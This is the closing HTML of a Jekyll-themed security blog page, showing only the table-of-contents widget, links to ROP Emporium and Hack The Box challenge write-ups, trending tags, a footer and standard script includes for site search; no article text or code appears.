src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/rop-emporium-ret2win/"><div class="card-body"> <em class="small" data-ts="1678392121" data-df="ll" > Mar 9, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ROP Emporium - ret2win (x64) - writeup</h3><div class="text-muted small"><p> ret2win is the first challenge in ROP Emporium series where you need to create very simple ROP to call specific function in binary to get the flag. As mentioned on challenge page we need to feed a...</p></div></div></a></div><div class="card"> <a href="/posts/rop-emporium-split/"><div class="card-body"> <em class="small" data-ts="1678741651" data-df="ll" > Mar 13, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ROP Emporium - split (x64) - writeup</h3><div class="text-muted small"><p> Split is a second challenge from ROP Emporium where your goal is to find elements scattered all over the binary and use them to get the flag. So, let’s start our hunting! First of all, checksec: ...</p></div></div></a></div><div class="card"> <a href="/posts/rop-emporium-callme/"><div class="card-body"> <em class="small" data-ts="1678836423" data-df="ll" > Mar 14, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ROP Emporium - callme (x64) - writeup</h3><div class="text-muted small"><p> In this task we need to call three functions: callme_one, callme_two and callme_three in exact order, also with proper function arguments. As mentioned on the challenge page, x86_64 binary uses dou...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-retired/" class="btn btn-outline-primary" prompt="Older"><p>HTB/Retired - writeup</p></a><div class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></div></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/pwntools/">pwntools</a> <a class="post-tag" href="/tags/rop/">rop</a> <a class="post-tag" href="/tags/emporium/">emporium</a> <a class="post-tag" href="/tags/x64/">x64</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/blue/">blue</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer overflow</a> <a class="post-tag" href="/tags/callme/">callme</a> <a class="post-tag" href="/tags/eternal-blue/">eternal_blue</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/farrimwildaxe">Farrim Wildaxe</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/unregister.js"></script>
